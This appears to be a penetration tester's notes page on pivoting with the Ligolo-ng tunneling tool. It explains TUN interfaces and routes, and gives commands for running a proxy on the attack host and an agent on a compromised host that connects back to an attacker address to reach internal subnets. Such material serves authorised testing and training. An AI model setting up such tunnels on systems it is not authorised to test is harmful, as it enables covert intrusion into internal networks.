# Tunneling / Ligolo-NG

## <mark style="color:$primary;">**PRINCIPLE OF WORK**</mark>

<mark style="color:red;">**Tunneling**</mark> works like a <mark style="color:purple;">**VPN between your machine and compromised hosts**</mark>. You run a proxy on your machine and an agent on a pivot. When the agent connects back, your machine creates a <mark style="color:yellow;">**virtual interface (tun0)**</mark> — this is basically a <mark style="color:purple;">**fake network card that makes it look like you are inside the internal network.**</mark>

To actually use it, you add <mark style="color:yellow;">**routes**</mark>. A route is just a rule like:

```bash
“if traffic is for 10.10.20.0/24 → send it through this agent”
```

So when you run something like:

```bash
nmap 10.10.20.15
```

your traffic goes into the **virtual interface (tun0)**, the proxy checks its routes, sees that this subnet belongs to a specific agent, and sends the traffic through that agent to the target. The response comes back the same way.

With multiple pivots, agents connect through each other, but you still only control everything from your machine. You just add more routes, and the proxy already knows which agent is reachable through which path, so traffic automatically flows like:

```bash
Attacker → Pivot1 → Pivot2 → Target
```

You don’t manually chain anything — the <mark style="color:yellow;">**interface makes it look local**</mark>, and the <mark style="color:yellow;">**routes decide where traffic goes**</mark><mark style="color:yellow;">.</mark>

<figure><img src="../../.gitbook/assets/Port-Forwarding_Socks5_Tunneling Schemes(6).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:$primary;">LIGOLO-NG</mark>

<mark style="color:red;">**Ligolo-ng**</mark> is a simple, lightweight and fast tool that allows pentesters to <mark style="color:purple;">**establish tunnels**</mark> from a reverse TCP/TLS connection using a **tunnel** interface.

### <mark style="color:green;">**MANUAL (IP commands)**</mark>

Creating and managing the TUN interface directly on your attack host without ligolo's built-in commands.

```bash
# Create TUN interface
sudo ip tuntap add user $(whoami) mode tun ligolo

# Bring it up
sudo ip link set ligolo up

# Add route to internal subnet through the interface
sudo ip r add 69.69.6.0/24 dev ligolo

# Delete when done
sudo ip tuntap del dev ligolo mode tun
```

### <mark style="color:green;">**LIGOLO CLI**</mark>

Managing interface and routing from inside the ligolo-ng proxy console.

```bash
# Start proxy on attack host
./proxy -laddr 13.13.13.13:443 -selfcert

# Run agent on compromised host
./agent -connect 13.13.13.13:443 -ignore-cert

# Inside proxy console — create interface
ligolo-ng » ifcreate --name ligolo

# Select session
ligolo-ng » session
? Specify a session : 1 - {MACHINE} - 13.13.13.13:51234

# Add route to internal subnet
ligolo-ng » route_add --name ligolo --route 192.168.1.0/24

# Start session
[Agent] » start

# Start tunnel on specific interface
[Agent] » tunnel_start --tun ligolo
```

{% hint style="info" %}
When you have multiple interfaces for the same **subnet**, only one route can be active at a time in your routing table. The other interface sits idle until you manually switch the route to it. So if you have setup which requires you to use different interfaces then you should make separate interfaces and use `tunnel_start` instead of just `start`
{% endhint %}

### <mark style="color:green;">**WEB UI**</mark>

Ligolo-ng has a web interface accessible after proxy starts. Default credentials `ligolo:password` — change in `ligolo-ng.yaml`.

**Agents** — shows all connected agents, configure tunneling per agent, autoroute option available.

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

**Interfaces** — create and manage TUN interfaces, add routes to internal subnets.

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

**Listeners** — configure port listeners on the agent side to forward traffic back to your attack host.

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:$primary;">RESOURCES</mark>

{% embed url="https://docs.ligolo.ng/Quickstart/" %}

{% embed url="https://docs.ligolo.ng/webui/" %}
